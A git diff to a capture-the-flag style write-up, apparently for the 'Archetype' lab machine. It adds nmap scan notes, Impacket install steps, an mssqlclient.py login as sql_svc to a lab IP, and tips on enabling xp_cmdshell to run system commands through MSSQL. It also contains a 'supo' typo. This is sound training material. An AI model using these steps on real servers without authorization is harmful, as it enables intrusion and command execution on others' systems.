@@ -4,11 +4,9 @@
   nmap -sV -sC -p- 10.129.95.187
   ```
 
-To see the versions of the services running (**-sV**)
-
-To perform a script scan using the default set of scripts (**-sC**)
-
-To scan all ports from 1 through 65535 (**-p-**)
+- To see the versions of the services running (**-sV**)
+- To perform a script scan using the default set of scripts (**-sC**)
+- To scan all ports from 1 through 65535 (**-p-**)
 
 
  Open Ports
@@ -53,5 +51,22 @@ Impacket is a collection of Python classes for working with network protocols. I
 
 https://github.com/SecureAuthCorp/impacket
 
+Impacket Installation Steps:
+```sh
+sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
+sudo pip3 install -r /opt/impacket/requirements.txt
+cd /opt/impacket
+supo python3 ./setup.py install
+```
+
+The command to connect and authenticate to the MSSQL server:
+```sh
+mssqlclient.py ARCHETYPE/sql_svc:{Password}@10.129.95.187 -windows-auth
+```
+
+- Please make sure to **enable xp_cmdshell** and **reconfigure**
+- Need to use **xp_cmdshell** before every comments
+  - xp_cmdshell dir --> Shows directory
+  - xp_cmdshell "powershell -c cd C:/; pwd" --> First changes dir to C:/ then shows pwd
 
 
